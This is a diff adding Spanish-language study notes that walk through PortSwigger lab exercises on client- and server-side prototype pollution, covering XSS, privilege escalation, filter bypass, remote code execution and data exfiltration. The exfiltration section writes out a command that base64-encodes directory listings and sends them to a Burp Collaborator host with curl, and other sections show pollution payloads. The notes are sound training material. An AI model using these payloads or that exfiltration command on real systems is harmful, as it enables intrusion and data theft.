@@ -183,3 +183,273 @@ Ya con esto terminamos el laboratorio.
 
 ## Client-side prototype pollution in third-party libraries
 
+Bueno en esta máquina podemos identificar primero el punto de inyección y esto es cuestión de probar mediante diferentes los diferentes métodos y formas que si tiene, en este caso la inyección es la siguiente:
+
+![[Pasted image 20260226191339.png]]
+
+Como podemos observar ya tenemos el punto de inyección, en este caso lo que vamos a hacer es intentar encontrar un punto de inyección [[Cross-Site Scripting XSS]], para esto analizamos los scripts de la web en busca de fallos.
+
+Mediante la documentación de Port Swigger tenemos una forma de intentar buscar de forma manual utilizando:
+
+```js
+Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
+    get() {
+        console.trace();
+        return 'polluted';
+    }
+})
+```
+
+El proceso es el siguiente nosotros tenemos que probar de forma manual por diferentes tipos de peticiones pasándole una propiedad el objetivo es que si la propiedad que le pasamos es vulnerable invocamos al `getter` donde al mismo forzamos una salida por consola con el texto `polluted`, entonces lo primero es capturar la respuesta principal de la peticion orginal en el Burp Suite para manipularla:
+
+![[Pasted image 20260226194134.png]]
+
+ahora modificamos antes del primer script para lograr poner un `debugger` de la siguiente manera:
+
+![[Pasted image 20260226194224.png]]
+
+Esto lo vamos a enviar y veremos lo siguiente en el navegador:
+
+![[Pasted image 20260226194304.png]]
+
+Como observamos se paro la ejecución, el punto ahora es en la consola ir probando mediante el código proporcionado diferentes propiedades, el proceso es cansoso y repetitivo pero certero. 
+
+Vamos a ver que al usar la propiedad `hitCallback`:
+
+![[Pasted image 20260226194538.png]]
+
+Tenemos que darle a play y veamos el resultado:
+![[Pasted image 20260226194638.png]]
+
+Vemos que en realidad se ejecuta el `trace` y también nos informa que `polluted` no esta definido y es lo que buscamos.
+
+Vamos a revizar porque nos da el punto exacto del fallo para saber en donde lo ejecuta exactamente y como, el objetivo de saber es poder adaptar el código malicioso a como se esta interpretando.
+
+![[Pasted image 20260226194939.png]]
+
+Entendiendo un poco el código vemos que llega el objeto `a` a la función donde de este objeto se extrae el valor de `tc` mediante su  `getter` donde se almacena en la variable `c`, ahora esta variable llega a ser interpretada dentro de un `setTimeout` entiendo que el mismo lo evalúa y es allí donde podemos obtener la ejecución de código, vamos a intentar entonces directamente a `hitCallback` asignarle un `alert(1)` para ver si es valido:
+
+![[Pasted image 20260226195522.png]]
+
+Como podemos observar si es valido por lo que ahora tenemos que sacarle a cookie de sesión a la victima y para esto necesitamos hacer que esta ingrese directamente en la inyección, esto con el exploit server que nos preparan es mucho mas sencillo quedando de la siguiente manera:
+
+![[Pasted image 20260226195735.png]]
+
+almacenamos y enviamos a ver que obtenemos:
+
+![[Pasted image 20260226195758.png]]
+
+listo la maquina queda resuelta.
+
+
+## Privilege escalation via server-side prototype pollution
+
+En este laboratorio vamos a ver como es posible elevar el privilegio de un usuario.
+
+Lo primero es entrar con el usuario que nos dan y vemos el siguiente panel:
+
+![[{9B6CB500-35BF-483F-8BD4-56B4B17AC716}.png]]
+
+Veamos como es que se tramitan estos datos al momento de enviarlos:
+
+![[{475CD6BA-666A-4982-9714-55965998283A}.png]]
+
+Observamos que la data se tramita por JSON, veamos la respuesta trabajando en el `repeater`:
+
+![[Pasted image 20260226212957.png]]
+
+Vemos muchos mas datos en la respuesta donde en realidad tenemos un `isAdmin`, quiero creer como verificador para el usuario en caso de ser `admin`.
+
+Directamente no podemos afectarlo, pero mediante un truco o diferentes trucos esto es posible.
+
+Nosotros solo podemos suponer el funcionamiento de las webs ya que no conocemos como estas construidas, por lo tanto lo que podemos imaginar por detrás de esta petición al llegar al servidor es que el mimos haga algo como:
+
+```js
+const body = JSON.parse(requestBody)
+```
+
+Lo que hace es convertir el texto en JSON que se le envia mediante la solicitud en un Objeto javascript para poder obtener los valores de cada uno, aquí es donde entra nuestro truco porque si esto es un objeto y es interpretado como tal podríamos enviar algo de la siguiente manera:
+
+![[Pasted image 20260226213916.png]]
+
+Lo que sucede es que no nos crea un objeto o propiedad `__proto__` sino que identifica que se quiere alterara los prototipos de `Object.prototype` por lo que crea o altera de forma interna, este es un punto de inyección.
+
+Para comprobar podemos enviar esto y ver si en la respuesta lo representa:
+
+![[Pasted image 20260226214142.png]]
+
+Como podemos observar tenemos ya la nueva propiedad `foo` y como tal no se encuentra en el objeto, si no, dentro del prototipo pero el acceder es lo mismo.
+
+Bueno  con esto ya en conocimiento podemos intentar alterar la propiedad de `isAdmin` claro esto no lo altera directamente sino que al asignarse en el prototipo se vuelve una propiedad heredada con un valor especifico por lo tanto podríamos llegar a alterarla de forma indirecta:
+
+ ![[Pasted image 20260226214435.png]]
+
+como podemos ver mediante la modificación del prototipo y porque la aplicación lo permite podemos llegar a alterar propiedades existentes.
+
+![[Pasted image 20260226214544.png]]
+
+Como vemos ya somos administradores y podemos terminar el laboratorio:
+
+![[Pasted image 20260226214639.png]]
+
+
+## Detecting server-side prototype pollution without polluted property reflection
+
+Al igual que en el anterior laboratorio vamos a tener un apartado para enviar o actualizar datos lo que vamos a capturar directamente:
+
+![[Pasted image 20260226220821.png]]
+
+Observamos directamente la petición y la respuesta.
+
+En este laboratorio no se nos pide escalar directamente a administrador si no, realizar un cambio sutil pero perceptible, para esto algo que podemos hacer es generar un error en el envío de datos para ver como responde ante esto el servidor:
+
+![[Pasted image 20260226221134.png]]
+
+El error es haber quitado una comilla y vemos que el servidor responde con el objeto `error`, el cual contiene varias propiedades, podemos intentar alterar en este caso la propiedad de `status`:
+
+![[Pasted image 20260226221357.png]]
+
+Directamente en la respuesta no vemos nada pero y si forzamos un error?
+
+![[Pasted image 20260226221441.png]]
+
+Como observamos logramos obligar al servidor a responder ante el error como `405` y no como `400` que era en un comienzo, por lo que si heredo la propiedad definida mediante la inyección del prototipo al `Object.prototipe`.
+
+![[Pasted image 20260226221556.png]]
+
+
+## Bypassing flawed input filters for server-side prototype pollution
+
+El objetivo es sobrepasar filtros de entrada defectuosos para generar un `protoype pollutio` de lado del servidor.
+
+comenzamos directo ya capturando la petición:
+
+![[Pasted image 20260226221937.png]]
+
+De la forma clásica como en anteriores laboratorios no vamos a lograr contaminar el prototipo.
+
+Para este caso vamos a contaminar mediante la propiedad constructor con la sintaxis de la siguiente manera:
+
+```JSON
+{
+    "constructor": {
+        "prototype": {
+            "foo": "bar",
+            "json spaces": 10
+        }
+    }
+}
+```
+
+Así que vamos a probarlo:
+
+![[Pasted image 20260226222422.png]]
+
+Podemos observar como se insertaron las propiedades que definimos, usualmente se usa `json spaces` para definir el valor del tabulador, en este caso no se aplica del todo pero es una forma de validar si se aplica la inyección.
+
+Ya validado realicemos la inyección a `isAdmin`:
+
+![[Pasted image 20260226222919.png]]
+
+Vemos que la inyección es valida por lo cual vamos a completar el laboratorio eliminando al usuario `carlos`:
+
+![[Pasted image 20260226223018.png]]
+
+## Remote code execution via server-side prototype pollution
+
+Bueno como ya se ha echo vamos directo a interceptar la petición y la respuesta para ver como se esta tramitando todo:
+
+![[Pasted image 20260226223706.png]]
+
+Vemos que directamente ya somos administrador, vamos a panel a ver que encontramos:
+
+![[Pasted image 20260226223838.png]]
+
+Vemos que podemos correr una serie de tareas de mantenimiento, veamos como es que esto se tramita:
+
+![[Pasted image 20260226224050.png]]
+
+Vemos que se realizan ciertas tareas tanto para la base de datos como para los archivos.
+
+El objetivo primero seria ver si podemos realizar una inyección:
+
+![[Pasted image 20260226224322.png]]
+
+En la petición original si se realiza si problema la inyección.
+
+Bueno tenemos que comprender ahora que vemos que es valida que cuando ejecutamos tareas de limpieza en el servidor usualmente y como buena practica en realidad se genera un proceso hijo para la ejecución de las tareas y como nos hablan de tener implementadas tecnologías como `node`, lo que puedo pensar es que se utilice módulos como `child_process.fork()` donde se genera el nuevo proceso hijo.
+
+Ahora algo que tenemos que saber es que a este a este modulo se le pasa el recurso el script que ejecuta las tareas, algunos argumentos y generalmente las opciones, ahora aquí lo que sucede es que en las opciones se puede incorporar `execArg` donde se puede enviar una lista de `flags` al binario de `node` cuando lanza los proceso  y uno de estos comando que se pueden ejecutar es `--eval` mediante el cual se puede ejecutar comando.
+
+Bueno una forma de jugar con eso seria de la siguiente manera:
+
+![[Pasted image 20260226225643.png]]
+
+Vamos a representarlo y dejarlo en la petición a ver si logramos algo:
+
+
+![[Pasted image 20260226230051.png]]
+
+En este punto ya contaminamos el el `Object.prototype` de forma global donde aquel objeto que no contenga la propiedad `execArgv`, la herede de forma contaminada, en este punto lo que vamos a hacer es ejecutar una limpieza:
+
+![[Pasted image 20260226230233.png]]
+
+
+## Exfiltrating sensitive data via server-side prototype pollution
+
+Tenemos que lograr primero la inyección, una vez que tenemos esta lista tenemos que identificar el gadget con el cual vamos a trabajar y mediante el cual tenemos que obtener el contenido de `/hom/carlos` mediante una ejecución de comandos y obtener al final el contenido de un archivo secreto dentro de ese directorio.
+
+Bueno es un laboratorio muy similar al anterior donde ya somos admin, tenemos los permisos de admin pero vamos a ver las dos peticiones, cuando enviamos datos y cuando realizamos la limpieza:
+
+![[Pasted image 20260226230830.png]]
+
+![[Pasted image 20260226230840.png]]
+
+Vemos las dos peticiones simplemente igual al anterior laboratorio donde vamos directamente primero a intentar una inyección a ver si es valido:
+
+
+![[Pasted image 20260226231020.png]]
+
+vemos que tenemos la misma inyección por lo que siguiendo la misma lógica de la anterior máquina anterior. Ahora no vamos a lograr una conexión directa eso si por lo que mediante investigación a la funcion `execSync` obtenemos que podemos pasarle parámetros como `shell` e `input`, aquí esta el truco y es que `shell` admite `vim` el cual mediante el `:! <comado>` podemos nosotros ejecutar comandos por lo tanto usando estas dos entradas queda:
+
+![[Pasted image 20260226232253.png]]
+
+Ahora es cuestión de ejecutar la limpieza y ver si lográmos obtener algo dentro del Burp Collaborator:
+
+![[Pasted image 20260226232417.png]]
+
+como podemos observar si llego y es realizado mediante `curl`.
+
+Ya con esto podemos vamos a provechar para ejecutar un comando de la siguiente manera:
+
+```bash
+ls -l /home/carlos | base64 | curl -d @- <burpCollaborator>
+```
+
+lo que hacemos en este punto es enviar la salida en `base64` del comando `ls /home/carlos` a nuestro Burp Collaborator:
+
+![[Pasted image 20260226232820.png]]
+
+como se observa envenenamos nuevamente y vamos a darle a la limpieza y veamos si funciona:
+
+![[Pasted image 20260226232909.png]]
+
+Pues al parecer esta funcionando `exelente`:
+
+![[Pasted image 20260226232948.png]]
+
+vemos el archivo secret, siguiendo el mismo concepto vamos a enviar el contenido de secret:
+
+![[Pasted image 20260226233039.png]]
+
+Ahora ya veamos si al ejecutar la limpieza nos llega el contenido:
+
+![[Pasted image 20260226233126.png]]
+
+Excelente, veamos el contenido:
+
+![[Pasted image 20260226233228.png]]
+
+pasemos esto al laboratorio y terminemos.
+
+![[Pasted image 20260226233302.png]]
